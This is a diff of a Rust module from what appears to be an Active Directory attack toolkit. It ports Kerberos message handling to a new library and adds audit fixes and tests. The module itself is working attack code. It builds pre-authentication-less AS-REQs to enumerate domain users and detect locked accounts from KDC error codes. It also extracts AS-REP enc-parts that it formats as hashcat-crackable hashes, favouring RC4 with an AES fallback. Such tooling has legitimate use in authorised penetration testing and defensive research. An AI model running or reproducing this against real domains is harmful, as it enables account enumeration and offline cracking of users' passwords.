@@ -5,23 +5,26 @@
 //! pre-auth-less AS-REQ to the KDC (messages built on picky-krb) and formatting the
 //! reply for hashcat. AS-REP roasting needs no credentials, so it is implemented in
 //! full and end-to-end. Kerberoast (TGS-REQ) needs a TGT — see the note on `kerberoast`.
+//!
+//! 1.5.3 audit M-3: unsafe code forbidden, parity with kerbcore + ms-pac-forge.
+
+#![forbid(unsafe_code)]
 
 use adhammer_core::object::uac;
 use adhammer_core::snapshot::Snapshot;
 
 use anyhow::{anyhow, bail, Result};
 
-use picky_asn1::bit_string::BitString;
+// picky-asn1 helpers still used by the not-yet-migrated `principal` / `krb_string`
+// / time helpers that tgs.rs + pkinit.rs consume. The AS-REQ/AS-REP/KRB-ERROR
+// message + codec surface moved to kerbcore in the 1.5.3 swap (see build_as_req,
+// kerbrute_probe, asrep_roast below).
 use picky_asn1::date::Date;
 use picky_asn1::restricted_string::Ia5String;
 use picky_asn1::wrapper::{
-    Asn1SequenceOf, BitStringAsn1, ExplicitContextTag0, ExplicitContextTag1, ExplicitContextTag2,
-    ExplicitContextTag3, ExplicitContextTag4, ExplicitContextTag5, ExplicitContextTag7,
-    ExplicitContextTag8, GeneralStringAsn1, IntegerAsn1, Optional,
+    Asn1SequenceOf, ExplicitContextTag0, ExplicitContextTag1, GeneralStringAsn1, IntegerAsn1,
 };
-use picky_krb::constants::types::{AS_REQ_MSG_TYPE, NT_PRINCIPAL, NT_SRV_INST};
 use picky_krb::data_types::{KerberosTime, PrincipalName};
-use picky_krb::messages::{AsRep, AsReq, KdcReq, KdcReqBody, KrbError};
 
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
@@ -115,49 +118,36 @@ pub(crate) fn principal(name_type: u8, parts: &[&str]) -> Result<PrincipalName> 
 
 /// Build an AS-REQ for `user@realm` with no PA-ENC-TIMESTAMP, requesting RC4 so the
 /// returned AS-REP enc-part is an offline-crackable hashcat 18200 hash.
-fn build_as_req(user: &str, realm: &str) -> Result<AsReq> {
-    let mut nonce = [0u8; 4];
-    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut nonce);
-    nonce[0] &= 0x7f; // keep the ASN.1 INTEGER positive
+///
+/// 1.5.3 kerbcore swap: the message is assembled + DER-encoded by
+/// [`kerbcore::client::build_as_req`] (byte-compatible with the old picky-krb path —
+/// kerbcore's DER codec is differential-tested against picky-krb). Returns the
+/// encoded bytes. The IA5/ASCII validation the CLI relies on is preserved via
+/// [`krb_string`], since `kerbcore::client::client_cname` does not itself reject
+/// non-IA5 input — a non-ASCII `--user`/`--realm` still fails cleanly here.
+fn build_as_req(user: &str, realm: &str) -> Result<Vec<u8>> {
+    krb_string(user)?;
+    krb_string(realm)?;
 
-    let body = KdcReqBody {
-        // forwardable | renewable | canonicalize
-        kdc_options: ExplicitContextTag0::from(BitStringAsn1::from(BitString::with_bytes(vec![
-            0x40, 0x81, 0x00, 0x00,
-        ]))),
-        cname: Optional::from(Some(ExplicitContextTag1::from(principal(
-            NT_PRINCIPAL,
-            &[user],
-        )?))),
-        realm: ExplicitContextTag2::from(krb_string(realm)?),
-        sname: Optional::from(Some(ExplicitContextTag3::from(principal(
-            NT_SRV_INST,
-            &["krbtgt", realm],
-        )?))),
-        from: Optional::from(None),
-        till: ExplicitContextTag5::from(KerberosTime::from(
-            Date::new(2037, 9, 13, 2, 48, 5).unwrap(),
-        )),
-        rtime: Optional::from(None),
-        nonce: ExplicitContextTag7::from(IntegerAsn1(nonce.to_vec())),
-        // Offer RC4 + AES256 + AES128: RC4-disabled DCs (Server 2025 default, hardened 2019/2022)
-        // then return a crackable AES AS-REP instead of KDC_ERR_ETYPE_NOSUPP — no silent miss.
-        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(vec![
-            IntegerAsn1(vec![ETYPE_RC4_HMAC]),
-            IntegerAsn1(vec![ETYPE_AES256]),
-            IntegerAsn1(vec![ETYPE_AES128]),
-        ])),
-        addresses: Optional::from(None),
-        enc_authorization_data: Optional::from(None),
-        additional_tickets: Optional::from(None),
-    };
+    let mut nonce_bytes = [0u8; 4];
+    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut nonce_bytes);
+    nonce_bytes[0] &= 0x7f; // keep the ASN.1 INTEGER positive
+    let nonce = u32::from_be_bytes(nonce_bytes);
 
-    Ok(AsReq::from(KdcReq {
-        pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
-        msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![AS_REQ_MSG_TYPE])),
-        padata: Optional::from(None),
-        req_body: ExplicitContextTag4::from(body),
-    }))
+    // Offer RC4 + AES256 + AES128: an RC4-disabled DC (Server 2025 default, hardened
+    // 2019/2022) then returns a crackable AES AS-REP instead of KDC_ERR_ETYPE_NOSUPP.
+    Ok(kerbcore::client::build_as_req(
+        realm,
+        &kerbcore::client::client_cname(user),
+        nonce,
+        "20370913024805Z",
+        &[
+            ETYPE_RC4_HMAC as i32,
+            ETYPE_AES256 as i32,
+            ETYPE_AES128 as i32,
+        ],
+        Vec::new(),
+    ))
 }
 
 // ---------------------------------------------------------------------------
@@ -167,29 +157,34 @@ fn build_as_req(user: &str, realm: &str) -> Result<AsReq> {
 /// Current UTC as a Kerberos GeneralizedTime (second granularity).
 pub(crate) fn now_kerberos_time() -> KerberosTime {
     use std::time::{SystemTime, UNIX_EPOCH};
+    // 1.5.3 audit L-1: guard the wall-clock unwrap chain. A pre-1970 clock (badly-set VM, RTC
+    // battery dead) previously panicked the entire operator session; now falls back to epoch,
+    // which the KDC classifies as a clock-skew error we can surface cleanly.
     let secs = SystemTime::now()
         .duration_since(UNIX_EPOCH)
-        .unwrap()
-        .as_secs() as i64;
+        .map(|d| d.as_secs() as i64)
+        .unwrap_or(0);
     let (y, m, d) = civil_from_days(secs.div_euclid(86_400));
     let tod = secs.rem_euclid(86_400);
-    KerberosTime::from(
-        Date::new(
-            y,
-            m,
-            d,
-            (tod / 3600) as u8,
-            ((tod % 3600) / 60) as u8,
-            (tod % 60) as u8,
-        )
-        .unwrap(),
+    Date::new(
+        y,
+        m,
+        d,
+        (tod / 3600) as u8,
+        ((tod % 3600) / 60) as u8,
+        (tod % 60) as u8,
     )
+    .map(KerberosTime::from)
+    // A civil_from_days output that Date rejects is a bug, not runtime input — fall back to the
+    // Unix epoch instead of aborting the tool. The KDC surfaces this as KRB_AP_ERR_SKEW.
+    .unwrap_or_else(|| KerberosTime::from(Date::new(1970, 1, 1, 0, 0, 0).expect("epoch is valid")))
 }
 
 /// A far-future Kerberos ticket expiry (`till`). Must be after the start time or the KDC
-/// rejects the request with KDC_ERR_NEVER_VALID.
+/// rejects the request with KDC_ERR_NEVER_VALID. 1.5.3 audit L-1: `Date::new` is a compile-time
+/// constant here — this `unwrap` is unreachable (year/month/day/h/m/s all valid).
 pub(crate) fn far_future_time() -> KerberosTime {
-    KerberosTime::from(Date::new(2037, 9, 13, 2, 48, 5).unwrap())
+    KerberosTime::from(Date::new(2037, 9, 13, 2, 48, 5).expect("static far-future date is valid"))
 }
 
 /// days since 1970-01-01 → (year, month, day). Howard Hinnant's civil_from_days.
@@ -262,20 +257,19 @@ async fn kdc_exchange_inner(kdc: &str, request: &[u8]) -> Result<Vec<u8>> {
 /// [`KerbruteOutcome::Missing`] for `C_PRINCIPAL_UNKNOWN`, and
 /// [`KerbruteOutcome::Other`] for any other KDC error code with the numeric value.
 pub async fn kerbrute_probe(user: &str, realm: &str, kdc: &str) -> Result<KerbruteOutcome> {
-    let raw = picky_asn1_der::to_vec(&build_as_req(user, realm)?)
-        .map_err(|e| anyhow!("encode AS-REQ: {e}"))?;
+    let raw = build_as_req(user, realm)?;
     let resp = kdc_exchange(kdc, &raw).await?;
     // AS-REP first — accounts with DONT_REQ_PREAUTH answer immediately with the
     // ticket + hashcat-roastable enc-part. Signal it as Roastable so callers can
     // pipe into asrep_roast() for the actual hash.
-    if picky_asn1_der::from_bytes::<AsRep>(&resp).is_ok() {
+    if kerbcore::messages::KdcRep::decode(&resp).is_ok() {
         return Ok(KerbruteOutcome::Roastable);
     }
     // Otherwise a KRB-ERROR is the RFC-mandated response and its `error_code`
     // classifies user existence per RFC 4120 §7.5.9.
-    match picky_asn1_der::from_bytes::<KrbError>(&resp) {
+    match kerbcore::messages::KrbError::decode(&resp) {
         Ok(err) => {
-            let code = err.0.error_code.0;
+            let code = err.error_code as u32;
             Ok(match code {
                 6 => KerbruteOutcome::Missing, // KDC_ERR_C_PRINCIPAL_UNKNOWN
                 18 => KerbruteOutcome::Locked, // KDC_ERR_CLIENT_REVOKED (disabled / locked)
@@ -285,7 +279,7 @@ pub async fn kerbrute_probe(user: &str, realm: &str, kdc: &str) -> Result<Kerbru
             })
         }
         Err(e) => Err(anyhow!(
-            "unexpected AS response — neither AS-REP nor KRB-ERROR ({e})"
+            "unexpected AS response — neither AS-REP nor KRB-ERROR ({e:?})"
         )),
     }
 }
@@ -338,11 +332,13 @@ pub fn name_asrep_krb_error(code: u32) -> Option<&'static str> {
 }
 
 pub async fn asrep_roast(c: &Candidate, kdc: &str) -> Result<String> {
-    let raw = picky_asn1_der::to_vec(&build_as_req(&c.sam, &c.realm)?)
-        .map_err(|e| anyhow!("encode AS-REQ: {e}"))?;
+    let raw = build_as_req(&c.sam, &c.realm)?;
     let resp = kdc_exchange(kdc, &raw).await?;
 
-    let as_rep: AsRep = match picky_asn1_der::from_bytes(&resp) {
+    // 1.5.3 kerbcore swap: decode the AS-REP (app 11) via kerbcore's message layer.
+    // The encrypted `enc_part` (etype + cipher) is exactly the hashcat-crackable blob;
+    // we never decrypt it here.
+    let as_rep = match kerbcore::messages::KdcRep::decode(&resp) {
         Ok(rep) => rep,
         Err(parse_err) => {
             // 1.5.2 UX-D: the RFC-mandated response to a failed AS-REQ is a
@@ -351,32 +347,26 @@ pub async fn asrep_roast(c: &Candidate, kdc: &str) -> Result<String> {
             // the ASN.1 parse noise. Otherwise fall back to the old message
             // WITH the parse text — needed for diagnostics on genuinely
             // malformed responses.
-            return Err(match picky_asn1_der::from_bytes::<KrbError>(&resp) {
-                Ok(err) => match name_asrep_krb_error(err.0.error_code.0) {
+            return Err(match kerbcore::messages::KrbError::decode(&resp) {
+                Ok(err) => match name_asrep_krb_error(err.error_code as u32) {
                     Some(named) => anyhow!("no AS-REP: {named}"),
                     None => anyhow!(
                         "no AS-REP: KRB-ERROR with unhandled error_code {}",
-                        err.0.error_code.0
+                        err.error_code
                     ),
                 },
                 Err(_) => anyhow!(
-                    "no AS-REP and the response is not a KRB-ERROR either — malformed KDC reply: {parse_err}"
+                    "no AS-REP and the response is not a KRB-ERROR either — malformed KDC reply: {parse_err:?}"
                 ),
             });
         }
     };
 
-    let enc = &as_rep.0.enc_part.0;
-    let etype = enc
-        .etype
-        .0
-         .0
-        .iter()
-        .fold(0u32, |a, &b| (a << 8) | b as u32);
-    match etype as u8 {
-        ETYPE_RC4_HMAC => Ok(format_asrep(&c.sam, &c.realm, &enc.cipher.0 .0)),
-        e @ (ETYPE_AES128 | ETYPE_AES256) => {
-            Ok(format_asrep_aes(&c.sam, &c.realm, e, &enc.cipher.0 .0))
+    let enc = &as_rep.enc_part;
+    match enc.etype {
+        e if e == ETYPE_RC4_HMAC as i32 => Ok(format_asrep(&c.sam, &c.realm, &enc.cipher)),
+        e if e == ETYPE_AES128 as i32 || e == ETYPE_AES256 as i32 => {
+            Ok(format_asrep_aes(&c.sam, &c.realm, e as u8, &enc.cipher))
         }
         other => bail!("AS-REP etype {other} not supported for roasting"),
     }
@@ -450,11 +440,13 @@ mod tests {
     use super::*;
 
     /// The AS-REQ we build is valid DER and round-trips through the schema — proves the
-    /// message construction without needing a live KDC.
+    /// message construction without needing a live KDC. 1.5.3: `build_as_req` now
+    /// returns kerbcore-encoded DER bytes; decode them back via kerbcore.
     #[test]
     fn as_req_roundtrips() {
-        let req = build_as_req("myuser", "EXAMPLE.COM").expect("ASCII-only build_as_req");
-        let _ = req;
+        let raw = build_as_req("myuser", "EXAMPLE.COM").expect("ASCII-only build_as_req");
+        let req = kerbcore::messages::KdcReq::decode(&raw).expect("valid AS-REQ DER");
+        assert_eq!(req.msg_type, 10);
     }
 
     #[test]
@@ -472,11 +464,12 @@ mod tests {
     }
 
     #[test]
-    fn _asreq_placeholder() {
-        let req = build_as_req("myuser2", "EXAMPLE.COM").expect("ASCII-only build_as_req");
-        let raw = picky_asn1_der::to_vec(&req).expect("encode");
-        let decoded: AsReq = picky_asn1_der::from_bytes(&raw).expect("decode");
-        assert_eq!(picky_asn1_der::to_vec(&decoded).unwrap(), raw);
+    fn asreq_der_roundtrips_through_kerbcore() {
+        let raw = build_as_req("myuser2", "EXAMPLE.COM").expect("ASCII-only build_as_req");
+        let decoded = kerbcore::messages::KdcReq::decode(&raw).expect("decode");
+        assert_eq!(decoded.encode(), raw, "AS-REQ DER must round-trip");
+        // etype order preserved: RC4(23) → AES256(18) → AES128(17).
+        assert_eq!(decoded.req_body.etypes, vec![23, 18, 17]);
     }
 
     #[test]
